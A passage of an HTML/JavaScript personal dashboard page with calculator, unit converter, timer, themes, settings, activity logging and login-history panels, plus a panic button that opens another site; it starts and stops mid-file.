                <button class="operator">/</button>
                <button class="operator">*</button>
                <button class="operator">-</button>
                <button>7</button><button>8</button><button>9</button>
                <button>4</button><button>5</button><button>6</button>
                <button>1</button><button>2</button><button>3</button>
                <button>.</button><button>0</button><button class="equals">=</button>
                <button class="operator">+</button>
            </div>
        </div>

        <div id="unitConverterPanel" class="info-panel converter-content">
            <div class="box-handle">Drag Handle</div>
            <h2>‚ÜîÔ∏è Unit Converter</h2>
            <div class="converter-row">
                <label for="fromUnit">Convert From:</label>
                <input type="number" id="convertValue" value="1" />
                <select id="fromUnit">
                    <option value="meters">Meters</option>
                    <option value="feet">Feet</option>
                    <option value="kilograms">Kilograms</option>
                    <option value="pounds">Pounds</option>
                </select>
            </div>
            <div class="converter-row">
                <label for="toUnit">Convert To:</label>
                <select id="toUnit">
                    <option value="feet">Feet</option>
                    <option value="meters">Meters</option>
                    <option value="pounds">Pounds</option>
                    <option value="kilograms">Kilograms</option>
                </select>
            </div>
            <div id="conversionResult" class="converter-result">Result: 0 feet</div>
            <button id="convertBtn">Convert</button>
        </div>

        <div id="timerStopwatchPanel" class="info-panel timer-content">
            <div class="box-handle">Drag Handle</div>
            <h2>‚è±Ô∏è Timer & Stopwatch</h2>
            <h3>Stopwatch</h3>
            <div id="stopwatchDisplay" class="timer-display">00:00:00</div>
            <div class="timer-controls">
                <button id="stopwatchStart">Start</button>
                <button id="stopwatchStop">Stop</button>
                <button id="stopwatchReset">Reset</button>
            </div>
            <h3>Timer</h3>
            <div id="timerDisplay" class="timer-display">00:00:00</div>
            <div class="timer-controls">
                <input type="number" id="timerInputMinutes" placeholder="Min" min="0" max="99" style="width: 60px;">
                <input type="number" id="timerInputSeconds" placeholder="Sec" min="0" max="59" style="width: 60px;">
                <button id="timerSet">Set</button>
                <button id="timerStart">Start</button>
                <button id="timerPause">Pause</button>
                <button id="timerReset">Reset</button>
            </div>
        </div>

        <div id="activityLogsDashboardPanel" class="info-panel activity-logs-content">
            <div class="box-handle">Drag Handle</div>
            <h2>üìÉ Dashboard Activity Logs</h2>
            <div id="dashboardLogsDisplay">No dashboard activity logged yet.</div>
            <button id="clearDashboardLogsBtn">Clear Logs</button>
        </div>

        <div id="loginHistoryDashboardPanel" class="info-panel login-history-content">
            <div class="box-handle">Drag Handle</div>
            <h2>‚è∞ Login History</h2>
            <div id="dashboardLoginHistoryDisplay">No login history available.</div>
        </div>

        <div id="statsPanel" class="info-panel stats-content">
            <div class="box-handle">Drag Handle</div>
            <h2>üìä User Statistics</h2>
            <p><strong>Buttons Pressed:</strong> <span id="statsButtonsPressed">0</span></p>
            <p><strong>Toggles Used:</strong> <span id="statsTogglesUsed">0</span></p>
            <p><strong>Panels Opened:</strong> <span id="statsPanelsOpened">0</span></p>
            <p><strong>Panels Closed:</strong> <span id="statsPanelsClosed">0</span></p>
            <p><strong>Canvas Actions:</strong> <span id="statsCanvasActions">0</span></p>
            <button id="clearStatsBtn">Reset Statistics</button>
        </div>

        <div id="mediaPanel" class="info-panel media-content">
            <div class="box-handle">Drag Handle</div>
            <h2>üì∫ Media Player (via Proxy)</h2>
            <div class="media-player">
                <input type="text" id="youtubeUrlInput" placeholder="Enter YouTube URL or Video ID">
                <button id="loadYoutubeBtn">Load</button>
                <iframe id="youtubePlayer" width="560" height="315" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                <p style="font-size: 0.8em; margin-top: 10px;">Note: Direct YouTube embed might be blocked. Using a proxy site might require adjusting iframe src to point to the proxy, e.g., `https://exampleproxy.com/watch?v=VIDEO_ID`. Actual proxy implementation not included.</p>
            </div>
        </div>

        <div id="reminderPanel" class="info-panel reminder-content">
            <div class="box-handle">Drag Handle</div>
            <h2>üîî Reminders</h2>
            <input type="text" id="reminderTextInput" placeholder="What do you want to be reminded about?">
            <input type="datetime-local" id="reminderTimeInput">
            <button id="addReminderBtn">Add Reminder</button>
            <div id="reminderList" style="margin-top: 10px;"></div>
        </div>

        <div id="settingsPanel" class="info-panel settings-content">
            <div class="box-handle">Drag Handle</div>
            <h2>‚öôÔ∏è Dashboard Settings</h2>

            <div class="settings-group">
                <h3>General Settings</h3>
                <div class="setting-item">
                    <label for="settingsThemeSelect">Theme:</label>
                    <select id="settingsThemeSelect">
                        <option value="dark-theme">Dark (Default)</option>
                        <option value="light-theme">Light</option>
                        <option value="neon-blue-theme">Neon Blue</option>
                        <option value="cyberpunk-green-theme">Cyberpunk Green</option>
                        <option value="retro-purple-theme">Retro Purple</option>
                        <option value="sunset-orange-theme">Sunset Orange</option>
                        <option value="grayscale-theme">Grayscale</option>
                    </select>
                </div>
                <div class="setting-item">
                    <label for="settingsFontSize">Font Size:</label>
                    <input type="range" id="settingsFontSize" min="0.8" max="1.5" step="0.1" value="1.0"> <span id="currentFontSize">1.0x</span>
                </div>
                <div class="setting-item">
                    <label for="settingsPanelColor">Default Panel Background Color:</label>
                    <input type="color" id="settingsPanelColor" value="#2a2a2a">
                </div>
                <div class="setting-item">
                    <label for="settingsAccentColor">Accent Color:</label>
                    <input type="color" id="settingsAccentColor" value="#ffe024">
                </div>
                <div class="setting-item">
                    <label for="settingsShowTooltips">Show Tooltips:</label>
                    <input type="checkbox" id="settingsShowTooltips" checked>
                </div>
                <div class="setting-item">
                    <label for="settingsToggleAnimations">Enable Animations:</label>
                    <input type="checkbox" id="settingsToggleAnimations" checked>
                </div>
                <div class="setting-item">
                    <label for="settingsEnableAlerts">Enable Pop-up Alerts:</label>
                    <input type="checkbox" id="settingsEnableAlerts" checked>
                </div>
                <button id="resetLayoutBtn" style="margin-top: 10px;">Reset Panel Layout</button>
            </div>

            <div class="settings-group">
                <h3>Security & Privacy</h3>
                <div class="setting-item">
                    <label for="settingsSessionTimeout">Session Timeout (minutes):</label>
                    <input type="number" id="settingsSessionTimeout" min="5" max="120" value="60">
                </div>
                <div class="setting-item">
                    <label for="settingsAutoLogout">Auto-logout on inactivity:</label>
                    <input type="checkbox" id="settingsAutoLogout" checked>
                </div>
                <div class="setting-item">
                    <label for="settingsPrivacyMode">Enable Privacy Mode:</label>
                    <input type="checkbox" id="settingsPrivacyMode">
                </div>
            </div>

            <div class="settings-group">
                <h3>Data Management</h3>
                <div class="setting-item">
                    <button id="backupDataBtn">Backup Dashboard Data</button>
                </div>
                <div class="setting-item">
                    <button id="restoreDataBtn">Restore Dashboard Data</button>
                </div>
                <div class="setting-item">
                    <button id="exportSettingsBtn">Export Settings</button>
                </div>
                <div class="setting-item">
                    <button id="importSettingsBtn">Import Settings</button>
                </div>
                <div class="setting-item">
                    <button id="clearAllDataBtn" style="background-color: #dc3545;">Clear All Local Data</button>
                </div>
            </div>
        </div>

        <div id="keybindsPanel" class="info-panel keybinds-content">
            <div class="box-handle">Drag Handle</div>
            <h2>‚å®Ô∏è Configurable Keybinds</h2>
            <table class="keybinds-table">
                <thead>
                    <tr>
                        <th>Action</th>
                        <th>Keybind</th>
                        <th>Configurable</th>
                    </tr>
                </thead>
                <tbody>
                    <tr><td>Toggle Calendar</td><td><code>Ctrl+Alt+C</code></td><td><button>Edit</button></td></tr>
                    <tr><td>Toggle Notes</td><td><code>Ctrl+Alt+N</code></td><td><button>Edit</button></td></tr>
                    <tr><td>Full Screen</td><td><code>F11</code></td><td><button>Edit</button></td></tr>
                    <tr><td>Panic Button</td><td><code>Shift+Esc</code></td><td><button>Edit</button></td></tr>
                    <tr><td>Toggle Theme</td><td><code>Ctrl+Shift+T</code></td><td><button>Edit</button></td></tr>
                    <tr><td>Show Settings</td><td><code>Ctrl+Alt+S</code></td><td><button>Edit</button></td></tr>
                    <tr><td>Logout</td><td><code>Ctrl+Alt+L</code></td><td><button>Edit</button></td></tr>
                </tbody>
            </table>
            <p style="margin-top: 15px; font-style: italic;">(Editing keybinds would typically involve a pop-up to capture new key combinations.)</p>
        </div>

    </div> <!-- End Additional Dashboard Panels -->


    <div id="canvasContainer">
      <h2>üñåÔ∏è Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="500"></canvas>
      <div id="canvasControls">
        <label for="canvasLineThickness">Thickness:</label>
        <input type="range" id="canvasLineThickness" min="1" max="10" value="2" step="1">
        <label for="canvasPenColor">Color:</label>
        <input type="color" id="canvasPenColor" value="#ff914d">
        <label for="canvasBgColor">Canvas BG:</label>
        <input type="color" id="canvasBgColor" value="#ffffff">
        <input type="text" id="textNoteInput" placeholder="Add text here">
        <button id="addTextNoteBtn">Add Text</button>
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
        <button id="undoCanvasBtn">Undo</button>
        <button id="redoCanvasBtn">Redo</button>
        <button id="eraseCanvasBtn">Eraser</button>
        <button id="resetViewCanvasBtn">Reset View</button>
      </div>
    </div>
  </div>

  <script>
    // --- Global Utility Functions ---
    let loginZoomLevel = 1.0;
    let dashboardZoomLevel = 1.0;
    const zoomStep = 0.1;
    const minZoom = 0.5;
    const maxZoom = 2.0;

    function applyZoom(element, level) {
      element.style.zoom = level; // Non-standard but widely supported
      element.style.transform = `scale(${level})`; // More standard approach, may need origin
      element.style.transformOrigin = 'top left'; // Adjust transform origin if scaling issues
    }

    function zoomIn(elementId) {
        let element = document.getElementById(elementId);
        if (!element) return;

        let currentZoomLevel = elementId.includes("login") ? loginZoomLevel : dashboardZoomLevel;

        if (currentZoomLevel < maxZoom) {
            currentZoomLevel = Math.min(maxZoom, currentZoomLevel + zoomStep);
            applyZoom(element, currentZoomLevel);
            if (elementId.includes("login")) {
                loginZoomLevel = currentZoomLevel;
            } else {
                dashboardZoomLevel = currentZoomLevel;
            }
        }
        activityLogger.log('Zoomed In', `Element: ${elementId}, New Zoom: ${currentZoomLevel.toFixed(1)}`);
        stats.trackAction('zoom', 'in');
    }

    function zoomOut(elementId) {
        let element = document.getElementById(elementId);
        if (!element) return;

        let currentZoomLevel = elementId.includes("login") ? loginZoomLevel : dashboardZoomLevel;

        if (currentZoomLevel > minZoom) {
            currentZoomLevel = Math.max(minZoom, currentZoomLevel - zoomStep);
            applyZoom(element, currentZoomLevel);
            if (elementId.includes("login")) {
                loginZoomLevel = currentZoomLevel;
            } else {
                dashboardZoomLevel = currentZoomLevel;
            }
        }
        activityLogger.log('Zoomed Out', `Element: ${elementId}, New Zoom: ${currentZoomLevel.toFixed(1)}`);
        stats.trackAction('zoom', 'out');
    }

    // Function to display alerts
    function showAlert(message, type = 'default', duration = 3000) {
        const alertBox = document.getElementById('dashboardAlert');
        if (!alertBox || !dashboard.settings.get('enableAlerts')) return; // Check if alerts are enabled

        alertBox.textContent = message;
        alertBox.className = 'dashboard-alert show'; // Reset classes, add 'show'
        if (type === 'error') alertBox.classList.add('error');
        if (type === 'success') alertBox.classList.add('success');
        if (type === 'warning') alertBox.classList.add('warning'); // Added warning type
        
        setTimeout(() => {
            alertBox.classList.remove('show');
            alertBox.className = 'dashboard-alert'; // Clean up classes
        }, duration);
        activityLogger.log('Alert Shown', message, type);
    }

    // Function to set up draggable/resizable for panels
    function makePanelDraggableResizable(selector) {
      $(selector).each(function() {
        if (!$(this).data('ui-draggable')) { // Prevent re-initializing
          $(this).draggable({
            handle: '.box-handle',
            containment: 'document', // Keep within body bounds
            stack: '.box, .info-panel' // Keep moved element on top
          }).resizable({
            minWidth: 300,
            minHeight: 150,
            handles: 'n, e, s, w, ne, nw, se, sw' // All directions
          });
        }
      });
      activityLogger.log('Enabled Panel Draggability/Resizability', `Selector: ${selector}`);
    }

    // Theme Management
    const themeManager = {
        availableThemes: {
            'dark-theme': {
                '--body-bg': '#0a0a0a', '--body-color': '#f0f0f0', '--login-box-bg': '#1a1a1a', '--input-bg': '#2a2a2a', '--button-bg': '#4a4a4a', '--button-color': '#f0f0f0',
                '--accent-color': '#ffe024', '--neon-glow-color-light': '#fef08a', '--neon-glow-color-medium': '#ffe024', '--neon-glow-color-strong': '#ffc400',
                '--error-color': '#ff4c4c',
                '--quickbar-button-bg': '#444', '--quickbar-button-color': '#eee', '--quickbar-button-hover-bg': '#555', '--quickbar-button-active-bg': '#333'
            },
            'light-theme': {
                '--body-bg': '#e0e0e0', '--body-color': '#1a1a1a', '--login-box-bg': '#ffffff', '--input-bg': '#f0f0f0', '--button-bg': '#d0d0d0', '--button-color': '#1a1a1a',
                '--accent-color': '#007bff', '--neon-glow-color-light': '#ADD8E6', '--neon-glow-color-medium': '#87CEEB', '--neon-glow-color-strong': '#6495ED',
                '--error-color': '#cc0000',
                '--quickbar-button-bg': '#f0f0f0', '--quickbar-button-color': '#333', '--quickbar-button-hover-bg': '#e9ecef', '--quickbar-button-active-bg': '#ced4da'
            },
            'neon-blue-theme': {
                '--body-bg': '#050a1a', '--body-color': '#e0eaff', '--login-box-bg': '#1a2033', '--input-bg': '#2a3147', '--button-bg': '#007bff', '--button-color': '#ffffff',
                '--accent-color': '#00FFFF', '--neon-glow-color-light': '#00FFFF', '--neon-glow-color-medium': '#00A0C0', '--neon-glow-color-strong': '#005F7F',
                '--error-color': '#dc3545',
                '--quickbar-button-bg': '#0056b3', '--quickbar-button-color': '#ffffff', '--quickbar-button-hover-bg': '#004080', '--quickbar-button-active-bg': '#002952'
            },
            'cyberpunk-green-theme': {
                '--body-bg': '#0d130d', '--body-color': '#c3e3c3', '--login-box-bg': '#1d231d', '--input-bg': '#2d382d', '--button-bg': '#28a745', '--button-color': '#000000',
                '--accent-color': '#00FF00', '--neon-glow-color-light': '#00FF00', '--neon-glow-color-medium': '#00C000', '--neon-glow-color-strong': '#007F00',
                '--error-color': '#ffc107',
                '--quickbar-button-bg': '#1e7e34', '--quickbar-button-color': '#000000', '--quickbar-button-hover-bg': '#155d28', '--quickbar-button-active-bg': '#0e3a1a'
            },
            'retro-purple-theme': {
                '--body-bg': '#1f0d2c', '--body-color': '#eccdff', '--login-box-bg': '#3c244c', '--input-bg': '#4d3361', '--button-bg': '#8a2be2', '--button-color': '#ffffff',
                '--accent-color': '#BF40BF', '--neon-glow-color-light': '#BF40BF', '--neon-glow-color-medium': '#8B008B', '--neon-glow-color-strong': '#4B0082',
                '--error-color': '#FF007F',
                '--quickbar-button-bg': '#8d16af', '--quickbar-button-color': '#ffffff', '--quickbar-button-hover-bg': '#670c84', '--quickbar-button-active-bg': '#400750'
            },
            'sunset-orange-theme': {
                '--body-bg': '#2c130d', '--body-color': '#ffead6', '--login-box-bg': '#4c2d24', '--input-bg': '#613e33', '--button-bg': '#ff8c00', '--button-color': '#ffffff',
                '--accent-color': '#FF4500', '--neon-glow-color-light': '#FFA500', '--neon-glow-color-medium': '#FF8C00', '--neon-glow-color-strong': '#FF4500',
                '--error-color': '#ff1a00',
                '--quickbar-button-bg': '#b35d00', '--quickbar-button-color': '#ffffff', '--quickbar-button-hover-bg': '#804200', '--quickbar-button-active-bg': '#4d2800'
            },
            'grayscale-theme': {
                '--body-bg': '#333333', '--body-color': '#eeeeee', '--login-box-bg': '#4d4d4d', '--input-bg': '#666666', '--button-bg': '#888888', '--button-color': '#000000',
                '--accent-color': '#bbbbbb', '--neon-glow-color-light': '#dddddd', '--neon-glow-color-medium': '#cccccc', '--neon-glow-color-strong': '#aaaaaa',
                '--error-color': '#ff4c4c', /* still red for error */
                '--quickbar-button-bg': '#999999', '--quickbar-button-color': '#000000', '--quickbar-button-hover-bg': '#aaaaaa', '--quickbar-button-active-bg': '#777777'
            }
        },

        applyTheme: function(themeName) {
            const theme = this.availableThemes[themeName];
            if (!theme) {
                console.warn(`Theme "${themeName}" not found.`);
                return;
            }

            for (const [prop, value] of Object.entries(theme)) {
                document.documentElement.style.setProperty(prop, value);
            }

            // Also update the body class if it needs light/dark specifics
            document.body.classList.remove('dark-theme', 'light-theme');
            if (themeName === 'light-theme') {
                document.body.classList.add('light-theme');
            } else {
                document.body.classList.add('dark-theme'); // default to dark handling for other themes
            }
            
            // Update the theme toggle text if in dashboard
            const themeBtn = document.getElementById('themeToggle');
            if (themeBtn) {
                themeBtn.innerText = (themeName === 'light-theme') ? '‚òÄÔ∏è Light Mode' : 'üåô Dark Mode';
            }
            dashboard.settings.save('selectedTheme', themeName); // Save selection
            activityLogger.log('Theme Changed', `To: ${themeName}`);
        },

        // Update selectedTheme based on the new themes for settings panel dropdown
        initializeThemeSelector: function() {
            const selectElement = document.getElementById('settingsThemeSelect');
            if (selectElement) {
                for (const themeName in this.availableThemes) {
                    const option = document.createElement('option');
                    option.value = themeName;
                    option.textContent = themeName.replace(/-/g, ' ').split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
                    selectElement.appendChild(option);
                }
                selectElement.value = dashboard.settings.get('selectedTheme', 'dark-theme'); // Set default or saved
            }
        }
    };


    // Activity Logging
    const activityLogger = {
        logs: [],
        init: function() {
            const storedLogs = localStorage.getItem('activityLogs');
            if (storedLogs) {
                this.logs = JSON.parse(storedLogs);
            }
        },
        log: function(action, details = '', type = 'info') {
            const timestamp = new Date().toLocaleString();
            const logEntry = { timestamp, action, details, type };
            this.logs.push(logEntry);
            localStorage.setItem('activityLogs', JSON.stringify(this.logs));
            // console.log(`Activity Log: ${action} - ${details}`);
            dashboard.ui.updateLogDisplay(); // Update dashboard display if open
            if(type === 'error') showAlert(action + ': ' + details, 'error', 5000); // Trigger alert for errors
            if(type === 'warning') showAlert(action + ': ' + details, 'warning', 4000); // Trigger alert for warnings
            if(type === 'info' && dashboard.settings.get('enableAlerts')) showAlert(action, 'success', 3000);
        },
        getLogs: function() {
            return this.logs;
        },
        clearLogs: function() {
            this.logs = [];
            localStorage.removeItem('activityLogs');
            dashboard.ui.updateLogDisplay();
            activityLogger.log('Activity Logs Cleared');
        },
        downloadLogs: function() {
            const jsonString = JSON.stringify(this.logs, null, 2);
            const blob = new Blob([jsonString], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `activity_logs_${new Date().toISOString()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            activityLogger.log('Activity Logs Downloaded');
        }
    };

    // User Statistics
    const stats = {
        data: {
            buttonsPressed: 0,
            togglesUsed: 0,
            panelsOpened: 0,
            panelsClosed: 0,
            canvasActions: 0
        },
        init: function() {
            const storedStats = localStorage.getItem('dashboardStats');
            if (storedStats) {
                this.data = JSON.parse(storedStats);
            }
        },
        trackAction: function(category, type) {
            if (!this.data[category + 's']) this.data[category + 's'] = 0; // Initialize if new category
            this.data[category + 's']++;
            localStorage.setItem('dashboardStats', JSON.stringify(this.data));
            // console.log(`Stats: ${category}s increased. Current: ${this.data[category+'s']}`);
            dashboard.ui.updateStatsDisplay(); // Update dashboard display if open
            activityLogger.log(`Stat Tracked: ${category}`, `Type: ${type}, Value: ${this.data[category+'s']}`);
        },
        getStats: function() {
            return this.data;
        },
        resetStats: function() {
            this.data = {
                buttonsPressed: 0,
                togglesUsed: 0,
                panelsOpened: 0,
                panelsClosed: 0,
                canvasActions: 0
            };
            localStorage.removeItem('dashboardStats');
            dashboard.ui.updateStatsDisplay();
            activityLogger.log('User Statistics Reset');
        }
    };

    // Login History
    const loginHistory = {
        history: [],
        init: function() {
            const storedHistory = localStorage.getItem('loginHistory');
            if (storedHistory) {
                this.history = JSON.parse(storedHistory);
            }
        },
        addEntry: function(username, userID, status) {
            const timestamp = new Date().toLocaleString();
            const entry = { timestamp, username, userID, status };
            this.history.push(entry);
            // Keep only the last 10-20 entries to prevent local storage bloat
            if (this.history.length > 20) {
                this.history = this.history.slice(this.history.length - 20);
            }
            localStorage.setItem('loginHistory', JSON.stringify(this.history));
            activityLogger.log('Login History Updated', `User: ${username}, Status: ${status}`);
        },
        getHistory: function() {
            return this.history;
        },
        updateLoginHistoryDisplay: function(elementId) {
            const displayDiv = document.getElementById(elementId);
            if (!displayDiv) return;

            displayDiv.innerHTML = '';
            if (this.history.length === 0) {
                displayDiv.textContent = 'No login history available.';
                return;
            }

            this.history.forEach(entry => {
                const p = document.createElement('p');
                p.textContent = `[${entry.timestamp}] User: ${entry.username}, ID: ${entry.userID}, Status: ${entry.status}`;
                displayDiv.appendChild(p);
            });
        }
    };


    // --- Loading Sequence JavaScript ---
    document.addEventListener('DOMContentLoaded', () => {
        const loadingScreen = document.getElementById('loadingScreen');
        const loadingText = document.getElementById('loadingText');
        const loginPageContainer = document.getElementById('loginPageContainer');

        activityLogger.init(); // Initialize activity logger early
        stats.init();
        loginHistory.init();


        setTimeout(() => {
            loadingText.style.backgroundImage = 'linear-gradient(to right, #2ecc71, #28a745)'; // Green tones for system complete
            loadingText.textContent = 'System Initialization Complete.';
            activityLogger.log('System Initialized');

            setTimeout(() => {
                loadingText.textContent = 'Initializing Login Page...';
                loadingText.style.backgroundImage = 'linear-gradient(to right, #ADD8E6, #6495ED)'; // Blue for login page

                // Fade out loading screen
                loadingScreen.style.opacity = '0';

                // Display login page after cube animation/fade
                setTimeout(() => {
                    loadingScreen.style.display = 'none';
                    loginPageContainer.style.display = 'flex';
                    loginPageContainer.classList.add('login-loaded'); // Trigger animation
                    setTimeout(() => {
                        loginPageContainer.style.opacity = '1';
                        document.body.style.overflow = 'auto'; // Re-enable scroll if needed
                        activityLogger.log('Login Page Loaded');
                        dashboard.login.initTimeDateBox(); // Start time/date clock for login page
                        dashboard.login.initLoginQuickBar(); // Initialize login quick bar
                        loginHistory.updateLoginHistoryDisplay('loginHistoryDisplay'); // Update history on login page
                        dashboard.login.updateLoginActivityDisplay();
                    }, 500); // Give some time for initial load animation
                }, 1000); // Matches opacity transition duration
            }, 1500);
        }, 2000); // Initial system init time
    });

    // Dashboard functionality object
    const dashboard = {
      user: null, // To store logged in user info
      alertShown: false, // For controlling the initial Welcome alert
      currentTheme: 'dark-theme', // Default theme

      settings: {
        _defaults: {
            selectedTheme: 'dark-theme',
            fontSize: 1.0,
            panelBgColor: '#2a2a2a',
            accentColor: '#ffe024',
            showTooltips: true,
            enableAnimations: true,
            enableAlerts: true,
            sessionTimeout: 60, // minutes
            autoLogout: false,
            privacyMode: false,
            // Canvas specific
            canvasPenColor: '#ff914d',
            canvasPenThickness: 2,
            canvasBgColor: '#ffffff'
        },
        _data: {},
        init: function() {
            const storedSettings = localStorage.getItem('dashboardSettings');
            if (storedSettings) {
                this._data = JSON.parse(storedSettings);
                // Merge with defaults for new settings
                this._data = { ...this._defaults, ...this._data };
            } else {
                this._data = { ...this._defaults };
            }
            this.applySettings();
        },
        save: function(key, value) {
            this._data[key] = value;
            localStorage.setItem('dashboardSettings', JSON.stringify(this._data));
            activityLogger.log('Setting Updated', `Key: ${key}, Value: ${value}`);
        },
        get: function(key, defaultValue = null) {
            return this._data[key] !== undefined ? this._data[key] : defaultValue;
        },
        applySettings: function() {
            // Apply theme
            const theme = this.get('selectedTheme', 'dark-theme');
            themeManager.applyTheme(theme);
            dashboard.currentTheme = theme; // Update global tracking

            // Apply font size
            const fontSize = this.get('fontSize');
            if (fontSize) {
                document.documentElement.style.fontSize = `${fontSize * 16}px`; // Base font size from 16px
                const currentFontSizeSpan = document.getElementById('currentFontSize');
                if (currentFontSizeSpan) currentFontSizeSpan.textContent = `${fontSize.toFixed(1)}x`;
            }

            // Apply custom colors if not default themes
            if (theme === 'dark-theme' || theme === 'light-theme') {
                document.documentElement.style.removeProperty('--body-bg');
                document.documentElement.style.removeProperty('--body-color');
                // ... remove other custom properties if any ...
            } else { // Custom themes would use the explicit values
                for (const [prop, value] of Object.entries(themeManager.availableThemes[theme])) {
                    document.documentElement.style.setProperty(prop, value);
                }
            }

            // Other toggles/settings
            // This is where animations, tooltips, etc. would be globally enabled/disabled
            // e.g. if(!this.get('enableAnimations')) { disable css animations etc }
            activityLogger.log('Settings Applied');
        },
        export: function() {
            const settingsJson = JSON.stringify(this._data, null, 2);
            const blob = new Blob([settingsJson], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `dashboard_settings_${new Date().toISOString()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showAlert('Settings Exported!', 'success');
        },
        import: function(file) {
            const reader = new FileReader();
            reader.onload = (e) => {
                try {
                    const importedSettings = JSON.parse(e.target.result);
                    // Merge and override current settings
                    this._data = { ...this._data, ...importedSettings };
                    this.applySettings(); // Re-apply all settings
                    localStorage.setItem('dashboardSettings', JSON.stringify(this._data));
                    showAlert('Settings Imported Successfully!', 'success');
                } catch (error) {
                    showAlert('Failed to import settings. Invalid JSON file.', 'error');
                }
            };
            reader.readAsText(file);
        },
        resetLayout: function() {
            // Logic to reset panel positions/sizes to default
            const panels = document.querySelectorAll('.box, .info-panel');
            panels.forEach(panel => {
                $(panel).attr('style', '').draggable('destroy').resizable('destroy'); // Clear inline styles and destroy widgets
            });
            dashboard.initMovables(); // Re-initialize with default positions/sizes
            showAlert('Panel layout reset to default!', 'success');
        },
        clearAllLocalData: function() {
            if (confirm('Are you sure you want to clear ALL local dashboard data (settings, logs, history, stats)? This cannot be undone.')) {
                localStorage.clear();
                alert('All local data cleared. Please refresh the page.');
                window.location.reload();
            }
        }
    },


      // Initialize all dashboard functionality
      init: function() {
        this.settings.init(); // Initialize settings first
        themeManager.initializeThemeSelector(); // Populate theme dropdown
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initMovables(); // Initialize draggable/resizable panels
        this.initSearchFunctionality(); // Search
        this.initCalculator();
        this.initUnitConverter();
        this.initTimerStopwatch();
        this.initMediaPlayer();
        this.initReminders();
        this.initFactsAndQuotes();
        this.ui.updateLoginHistoryDisplay('dashboardLoginHistoryDisplay'); // Update login history panel
        this.ui.updateLogDisplay(); // Update activity log panel
        this.ui.updateStatsDisplay(); // Update stats panel
        this.ui.setupSettingsListeners(); // Setup settings listeners
      },

      login: {
        is24HourFormat: false, // Default to 12-hour format
        initTimeDateBox: function() {
          const displayElement = document.getElementById('loginCurrentDateTime');
          const toggleCheckbox = document.getElementById('toggle24HrFormat');

          const updateTimeDate = () => {
            const now = new Date();
            let timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric' };
            if (!this.is24HourFormat) {
              timeOptions.hour12 = true;
            } else {
              timeOptions.hour12 = false;
              timeOptions.hourCycle = 'h23'; // Ensures 0-23 for 24-hour format
            }
            const timeStr = now.toLocaleTimeString(navigator.language, timeOptions);
            const dateStr = now.toLocaleDateString(navigator.language, { month: 'short', day: 'numeric', year: 'numeric' });
            displayElement.textContent = `${timeStr} - ${dateStr}`;
          };

          toggleCheckbox.checked = this.is24HourFormat; // Set initial state of checkbox
          toggleCheckbox.addEventListener('change', () => {
            this.is24HourFormat = toggleCheckbox.checked;
            updateTimeDate();
            activityLogger.log('Toggled 24-hour format', `Login Page: ${this.is24HourFormat}`);
            stats.trackAction('toggle', 'timeFormat');
          });

          updateTimeDate();
          setInterval(updateTimeDate, 1000);
        },
        initLoginQuickBar: function() {
            document.getElementById('loginPanicBtn').addEventListener('click', () => {
                window.open('https://clever.com', '_blank');
                activityLogger.log('Login Panic Button Pressed');
                stats.trackAction('button', 'loginPanic');
            });
            document.getElementById('loginZoomInBtn').addEventListener('click', () => {
                zoomIn('loginPageContainer');
                stats.trackAction('button', 'loginZoomIn');
            });
            document.getElementById('loginZoomOutBtn').addEventListener('click', () => {
                zoomOut('loginPageContainer');
                stats.trackAction('button', 'loginZoomOut');
            });
            document.getElementById('loginActivityLogsBtn').addEventListener('click', () => {
                const panel = document.getElementById('loginActivityLogPanel');
                panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
                this.updateLoginActivityDisplay();
                activityLogger.log('Toggled Login Activity Logs');
                stats.trackAction('toggle', 'loginActivityLogs');
                if(panel.style.display === 'block') stats.trackAction('panel', 'opened');
                else stats.trackAction('panel', 'closed');
            });
            document.getElementById('loginHistoryBtn').addEventListener('click', () => {
                const panel = document.getElementById('loginHistoryPanel');
                panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
                loginHistory.updateLoginHistoryDisplay('loginHistoryDisplay');
                activityLogger.log('Toggled Login History Panel');
                stats.trackAction('toggle', 'loginHistoryPanel');
                if(panel.style.display === 'block') stats.trackAction('panel', 'opened');
                else stats.trackAction('panel', 'closed');
            });
            // Show password toggle
            document.getElementById('showPassword').addEventListener('change', (e) => {
                const passwordInput = document.getElementById('password');
                passwordInput.type = e.target.checked ? 'text' : 'password';
                activityLogger.log('Show Password Toggled', `State: ${e.target.checked}`);
                stats.trackAction('toggle', 'showPassword');
            });
        },
        updateLoginActivityDisplay: function() {
            const displayDiv = document.getElementById('loginLogsDisplay');
            if (!displayDiv) return;

            displayDiv.innerHTML = '';
            const logs = activityLogger.getLogs().filter(log => log.action.includes('Login') || log.action.includes('Attempt') || log.action.includes('Zoom')); // Filter for login-specific actions

            if (logs.length === 0) {
                displayDiv.textContent = 'No recent login activity.';
                return;
            }

            logs.forEach(entry => {
                const div = document.createElement('div');
                div.classList.add('log-entry');
                if (entry.type === 'error') div.classList.add('error-log');
                div.innerHTML = `<span><strong>${entry.timestamp}:</strong> ${entry.action}</span><span>Details: ${entry.details}</span>`;
                displayDiv.appendChild(div);
            });
        }
      },

      ui: { // Centralized UI updates and handlers
        updateLogDisplay: function() {
            const displayDiv = document.getElementById('dashboardLogsDisplay');
            if (!displayDiv) return;

            displayDiv.innerHTML = '';
            if (activityLogger.getLogs().length === 0) {
                displayDiv.textContent = 'No dashboard activity logged yet.';
                return;
            }

            activityLogger.getLogs().forEach(entry => {
                const div = document.createElement('div');
                div.classList.add('log-entry');
                if (entry.type === 'error') div.classList.add('error-log');
